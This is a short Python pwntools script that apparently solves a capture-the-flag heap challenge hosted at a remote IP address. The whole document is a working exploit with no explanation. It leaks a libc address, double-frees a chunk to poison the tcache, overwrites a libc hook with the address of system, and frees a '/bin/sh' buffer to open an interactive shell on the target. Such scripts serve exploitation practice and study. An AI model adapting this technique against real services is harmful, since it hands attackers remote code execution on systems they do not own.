from pwn import *

r = remote('35.200.202.92', 1337)

def add(index, size, data):
	r.sendafter('>> ', '1\n')
	r.sendafter('Enter the index:\n', str(index) + '\n')
	print 1
	r.sendafter('Enter the size:\n', str(size) + '\n')
	print 1
	r.sendafter('Enter data:\n', data + '\n')
	print 1

def delete(index):
	r.sendafter('>> ', '3\n')
	r.sendafter('Enter the index:\n', str(index) + '\n')

def view(index):
	r.sendafter('>> ', '4\n')
	r.sendafter('Enter the index:\n', str(index) + '\n')
	return r.recvuntil('\n\n1) Add data').split('\n\n1) Add data')[0].split('Your data :')[1]

add(0, 0x400, 'test')
add(1, 0x400, 'test')
add(2, 0x10, 'test')

for _ in range(7):
	delete(0)

delete(1)

libc = u64(view(1)[:6].ljust(8, '\x00')) - 0x3ebca0

log.success('Libc @ ' + hex(libc))

delete(2)
delete(2)

add(3, 0x10, p64(libc + 0x3ed8e8))
add(4, 0x10, '/bin/sh\x00')

add(5, 0x10, p64(libc + 0x4f440))

delete(4)

r.interactive()
